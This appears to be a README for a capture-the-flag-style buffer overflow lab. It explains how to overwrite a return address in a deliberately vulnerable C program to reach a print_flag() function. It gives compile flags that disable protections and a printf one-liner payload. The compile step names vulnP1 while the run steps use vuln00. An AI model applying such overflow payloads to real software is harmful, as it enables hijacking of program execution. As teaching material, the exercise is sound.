# Program00 - Basic EIP Control via Buffer Overflow

## Description
This exercise demonstrates controlling program execution by overwriting the return address to redirect to a `print_flag()` function.

## Files
- `vuln00.c`: Vulnerable C program
- `payload.py`: Exploit generator
- `pattern.py`: Offset calculator
- `approach.txt`: Personal notes
- `Description.txt`: Learning objectives

## How to Reproduce

1. Compile the program:
```bash
gcc -m32 -fno-stack-protector -z execstack -no-pie vulnP1.c -o vulnP1
```

2. Find the offset (76 bytes in this case):
```bash
python3 pattern.py
```

3. Generate the payload:
```bash
python3 payload.py
```

4. Execute the exploit:
```bash
./vuln00 < payload_func
```

5. Alternative Execution:
```bash
printf "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xd5\x91\x04\x08" | ./vuln00
```

## Key Learnings
- Finding return address offset
- Converting addresses to little-endian
- Crafting precise payloads
- Redirecting program execution